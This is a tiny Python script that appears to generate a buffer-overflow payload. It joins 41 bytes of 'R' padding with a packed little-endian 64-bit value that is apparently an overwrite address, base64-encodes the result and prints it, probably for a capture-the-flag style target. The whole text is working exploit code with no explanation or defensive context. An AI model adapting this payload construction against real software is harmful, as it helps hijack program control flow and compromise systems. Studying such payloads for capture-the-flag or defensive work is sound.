
import sys
import struct
import base64

buf = b'RRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR'
buf += struct.pack('<Q', 9366534411235290019)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
